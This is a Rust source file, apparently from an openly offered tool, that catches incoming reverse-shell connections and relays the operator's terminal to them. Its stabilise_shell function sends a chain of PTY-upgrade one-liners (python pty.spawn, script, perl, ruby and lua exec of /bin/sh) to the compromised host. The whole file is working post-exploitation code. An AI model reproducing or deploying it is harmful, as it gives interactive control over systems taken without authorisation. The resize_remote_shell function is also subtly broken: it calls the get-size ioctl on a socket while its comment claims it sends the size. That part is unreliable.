use libc::{TIOCGWINSZ, ioctl, winsize};
use nix::unistd::isatty;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::os::unix::io::AsRawFd;
use std::sync::{
    Arc,
    atomic::{AtomicBool, Ordering},
};
use std::thread;
use std::time::Duration;
use termion::raw::IntoRawMode;
use termion::screen::AlternateScreen;
use termios::{ECHO, ICANON, ISIG, TCSANOW, Termios, tcsetattr};

// PTY stabilize
pub fn stabilise_shell(mut stream: &TcpStream) {
    println!("🔧Attempting to spawn a PTY shell...");
    // PTY techniques
    let cmd = r#"
    if command -v python3 > /dev/null 2>&1; then
        python3 -c 'import pty; pty.spawn("/bin/bash")'
    elif command -v python2 > /dev/null 2>&1; then
        python2 -c 'import pty; pty.spawn("/bin/bash")'
    elif command -v python > /dev/null 2>&1; then
        python -c 'import pty; pty.spawn("/bin/bash")'
    elif command -v script > /dev/null 2>&1; then
        /usr/bin/script -qc /bin/bash /dev/null
    elif command -v perl > /dev/null 2>&1; then
        perl -e 'exec "/bin/sh";'
    elif command -v ruby > /dev/null 2>&1; then
        ruby -e 'exec "/bin/sh"'
    elif command -v lua > /dev/null 2>&1; then
        lua -e "os.execute('/bin/sh')"
    else
        echo "No suitable PTY spawn method found, continuing without PTY."
    fi
    "#;
    let _ = stream.write_all(cmd.as_bytes());
    let _ = stream.write_all(b"\n");
    let _ = stream.flush();
    thread::sleep(Duration::from_millis(500));

    let _ = stream.write_all(b"export TERM=xterm-256color\nstty raw -icannon echo \nclear\n");
    let _ = stream.flush();
    thread::sleep(Duration::from_millis(200));
}

// Resize the shell (nano etc)
pub fn resize_remote_shell(stream: &TcpStream) {
    let fd = stream.as_raw_fd();
    let mut ws: winsize = unsafe { std::mem::zeroed() };

    unsafe {
        ioctl(0, TIOCGWINSZ, &mut ws); // Get local terminal size
        ioctl(fd, TIOCGWINSZ, &ws); // Send to remote
    }
}

// Handle clients
pub fn handle_client(mut stream: TcpStream, addr: String) {
    if !isatty(0).unwrap_or(false) {
        eprintln!("⚠️  No TTY detected, shell may be unstable!");
    }

    let mut orig_term = Termios::from_fd(0).expect("Failed to get terminal attributes");
    let mut raw_term = orig_term.clone();

    raw_term.c_lflag &= !(ICANON | ECHO | ISIG);
    tcsetattr(0, TCSANOW, &raw_term).expect("Failed to set raw terminal mode");

    let stdout = io::stdout().into_raw_mode().unwrap();
    let _screen = AlternateScreen::from(stdout);
    resize_remote_shell(&stream);

    let mut stdin = io::stdin();
    let mut stdout = io::stdout().into_raw_mode().unwrap();
    let mut stream_in = stream.try_clone().unwrap();

    let exit_flag = Arc::new(AtomicBool::new(false));
    let exit_flag_input = exit_flag.clone();
    let exit_flag_output = exit_flag.clone();

    let input_thread = thread::spawn(move || {
        let mut buffer = [0u8; 1024];
        loop {
            if exit_flag_input.load(Ordering::Relaxed) {
                break;
            }
            match stdin.read(&mut buffer) {
                Ok(0) => break, // EOF
                Ok(n) => {
                    // Check for Ctrl+Q (0x11)
                    for &byte in &buffer[..n] {
                        if byte == 0x11 {
                            eprintln!("Ctrl+Q detected, exiting...");
                            exit_flag_input.store(true, Ordering::Relaxed);
                            std::process::exit(0); // Exit immediately
                        }
                    }
                    if stream_in.write_all(&buffer[..n]).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Thread for reading from remote and printing locally
    let output_thread = thread::spawn(move || {
        let mut buffer = [0u8; 1024];
        loop {
            if exit_flag_output.load(Ordering::Relaxed) {
                break;
            }
            match stream.read(&mut buffer) {
                Ok(0) => break,
                Ok(n) => {
                    if stdout.write_all(&buffer[..n]).is_err() {
                        break;
                    }
                    stdout.flush().unwrap();
                }
                Err(_) => break,
            }
        }
    });

    let _ = input_thread.join();
    let _ = output_thread.join();

    tcsetattr(0, TCSANOW, &orig_term).expect("Failed to restore terminal state");
}

// Copyright (c) 2025 MuteAvery
// Licensed under the MIT License. See LICENSE file in the project root
